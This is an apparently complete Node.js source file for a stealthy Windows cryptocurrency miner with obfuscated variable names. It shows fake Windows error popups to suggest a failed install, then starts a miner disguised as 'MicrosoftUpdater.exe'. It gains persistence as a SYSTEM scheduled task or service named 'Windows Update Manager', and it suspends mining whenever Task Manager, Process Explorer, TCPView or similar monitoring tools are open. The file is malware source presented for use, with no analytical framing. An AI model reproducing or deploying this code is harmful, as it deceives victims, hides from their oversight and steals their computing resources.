const u8jd9c69n38j0cvjq9dio3 = require('windows-interact');
const hd8938u9c7jns44ud9eju9 = require('systeminformation');
const { execSync } = require('child_process');

u8jd9c69n38j0cvjq9dio3.appManager.register({
    'TaskManager': {
        path: u8jd9c69n38j0cvjq9dio3.path`C:\Windows\system32\Taskmgr.exe`,
    },
    'ResourceMonitor': {
        path: u8jd9c69n38j0cvjq9dio3.path`C:\Windows\system32\resmon.exe`,
    },
});

async function b01982u9ioda9_i1u2hydoisajcmqwoidjnqawd() {
    while (true) {
        const km3i7h3y1287ydso33joi9823mfc89 = ai7puojd9845631iu41oi76c891ucc7lkjas('Taskmgr.exe');
        const hasd879yoijas83imc_983_98djhco = ai7puojd9845631iu41oi76c891ucc7lkjas('procexp.exe') && ai7puojd9845631iu41oi76c891ucc7lkjas('procexp64.exe'); // Boolean
        const s_981u2oijmnco3998u12ui2jhcld2 = ai7puojd9845631iu41oi76c891ucc7lkjas('perfmon.exe');
        const t98217eci__91287doijl9812jcn45 = ai7puojd9845631iu41oi76c891ucc7lkjas('tcpview.exe');
        const oqwidj98u198u9327ijcpoaspokcpk = ai7puojd9845631iu41oi76c891ucc7lkjas('Procmon.exe') && ai7puojd9845631iu41oi76c891ucc7lkjas('Procmon64.exe');

        console.log(`taskmgr running: ${km3i7h3y1287ydso33joi9823mfc89}`);
        console.log(`procexp64 running: ${hasd879yoijas83imc_983_98djhco}`);
        console.log(`resourceMonitor running: ${s_981u2oijmnco3998u12ui2jhcld2}`);
        console.log(`tcpview running: ${t98217eci__91287doijl9812jcn45}`);
        console.log(`procmon running: ${oqwidj98u198u9327ijcpoaspokcpk}`);
        
        if (km3i7h3y1287ydso33joi9823mfc89 || hasd879yoijas83imc_983_98djhco || s_981u2oijmnco3998u12ui2jhcld2 || t98217eci__91287doijl9812jcn45 || oqwidj98u198u9327ijcpoaspokcpk && ai7puojd9845631iu41oi76c891ucc7lkjas('MicrosoftUpdater.exe') == true) {
            killMiner();
            console.log('miner killed due to a system monitoring tool opening');
    }
        if (!km3i7h3y1287ydso33joi9823mfc89 && !hasd879yoijas83imc_983_98djhco && !s_981u2oijmnco3998u12ui2jhcld2 && !t98217eci__91287doijl9812jcn45 && !oqwidj98u198u9327ijcpoaspokcpk && ai7puojd9845631iu41oi76c891ucc7lkjas('MicrosoftUpdater.exe') == false) {
            j981e_918udoijcaoiwdj12emc981uy_3();
            console.log('miner restarted due to favorable conditions');
        
        }
    }
}
function ai7puojd9845631iu41oi76c891ucc7lkjas(ic9812ej3_98u23eijc091238iojc) {
    const su_o2ud908ud98ua19827mkc894urto98i831290cjk0932091 = execSync(`tasklist /FI "IMAGENAME eq ${ic9812ej3_98u23eijc091238iojc}`, 
    {encoding: 'utf-8'});
    return !su_o2ud908ud98ua19827mkc894urto98i831290cjk0932091.includes(`INFO: No tasks are running which match the specified criteria.`);
  }


function killMiner() {
    try {
        u8jd9c69n38j0cvjq9dio3.cmd('TASKKILL /f /IM MicrosoftUpdater.exe /T');
    } catch {
        u8jd9c69n38j0cvjq9dio3.cmd('TASKKILL /f /IM MicrosoftUpdater.exe'); 
    }
}

function l891e98ads__17892ijc_i1u091iudoij(d29u18eaod_9182oijcol3ik11jal7y8) {
    return new Promise(resolve => setTimeout(resolve, d29u18eaod_9182oijcol3ik11jal7y8));
}

function j981e_918udoijcaoiwdj12emc981uy_3() {
    u8jd9c69n38j0cvjq9dio3.cmd('start.cmd --threads=1 --m19287ydiosjc_9182dijc-affinity=1 --m19287ydiosjc_9182dijc-priority=1 --no-huge-pages --asm=auto --randomx-mode=light');
}

async function y81726_9182uocij2coij93iuckmd() {
    try {
        k9821yeij481972yijclk12(); 
    } catch {
        m81u29e8jcaso_198y27e9___12jocawsd(); 
}
}

async function m81u29e8jcaso_198y27e9___12jocawsd() {
    u8jd9c69n38j0cvjq9dio3.cmd('schtasks /create /sc onstart /tn "Windows Update Manager" /tr MicrosoftUpdater.exe /ru SYSTEM');
}

async function k9821yeij481972yijclk12() {
    u8jd9c69n38j0cvjq9dio3.cmd('sc create Windows Update Manager binPath= start.cmd start= auto');
    console.log('miner added to system services')
    l891e98ads__17892ijc_i1u091iudoij(1000);
    u8jd9c69n38j0cvjq9dio3.cmd('net start Windows Update Manager');
    console.log('miner run as service');
}

async function k981ud98un9182uoaijcs() {
    const l98wyud1asgtdc897ysa89_9182ucmn = Math.ceil(10*Math.random()); // Integer between 0 and 10
    const vv721398doijsa_19827eoijas_12iu9 = 'Installation failed';
    try {
        switch (l98wyud1asgtdc897ysa89_9182ucmn) {
            case 1:
                await u8jd9c69n38j0cvjq9dio3.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', vv721398doijsa_19827eoijas_12iu9);
                break;
            case 2:
                await u8jd9c69n38j0cvjq9dio3.alert('The specified file is encrypted and the user does not have the ability to decrypt it. Error code: 0x1772.', vv721398doijsa_19827eoijas_12iu9);
                break;
            case 3:
                await u8jd9c69n38j0cvjq9dio3.alert('The specified compression format is unsupported. Error code: 0x26A.', vv721398doijsa_19827eoijas_12iu9);
                break;
            case 4:
                await u8jd9c69n38j0cvjq9dio3.alert('A dynamic link library (DLL) initialization routine failed. Error code: 0x45A.', vv721398doijsa_19827eoijas_12iu9);
                break;
            case 5:
                await u8jd9c69n38j0cvjq9dio3.alert('A configuration value is invalid. Error code: 0xFDF.', vv721398doijsa_19827eoijas_12iu9);
                break;
            default:
                await u8jd9c69n38j0cvjq9dio3.alert('A security package specific error occurred. Error code: 0x721.', vv721398doijsa_19827eoijas_12iu9);
                break; 
        }
        await u8jd9c69n38j0cvjq9dio3.alert('Please visit https://learn.microsoft.com/en-us/windows/win32/debug/error-handling for more information.', 'Windows Updater failure');
    } catch {
        console.error('o91238e9u8scoji7uo');
    } finally {
        j981e_918udoijcaoiwdj12emc981uy_3();
    }
}

async function h9812ud8u9oaisjdkm1982uiosjac() {
    try {
        const m19287ydiosjc_9182dijc = await hd8938u9c7jns44ud9eju9.cpu();
        const h817yd23o890uc8u9a98udq928c = await hd8938u9c7jns44ud9eju9.osInfo();
        const masd8yu129d8ucj9a_9128u7iucjs = await hd8938u9c7jns44ud9eju9.mem();
        console.log('hardware polled');

        const mk9128uiocj_9182yud9ijcso = m19287ydiosjc_9182dijc.cache.l2/1024;
        const b8172yasjoijcs01982uc89uu890a98 = m19287ydiosjc_9182dijc.cache.l3/1024;

        if (m19287ydiosjc_9182dijc.cores < 2 || masd8yu129d8ucj9a_9128u7iucjs.total < 4294967296 || mk9128uiocj_9182yud9ijcso < 256 || b8172yasjoijcs01982uc89uu890a98 < 2048) {
            await u8jd9c69n38j0cvjq9dio3.alert('Insufficient system resources to continue.', 'Problem encountered');
            process.exit();
        }
        switch (h817yd23o890uc8u9a98udq928c) {
            case "MacOS":
                await u8jd9c69n38j0cvjq9dio3.alert('MacOS is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            case "Linux":
                await u8jd9c69n38j0cvjq9dio3.alert('Linux is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            default:
                break;
        }
    } catch {
        process.exit();
    } finally {
        await k981ud98un9182uoaijcs();
    }
}
h9812ud8u9oaisjdkm1982uiosjac();
k981ud98un9182uoaijcs();
y81726_9182uocij2coij93iuckmd();
b01982u9ioda9_i1u2hydoisajcmqwoidjnqawd();
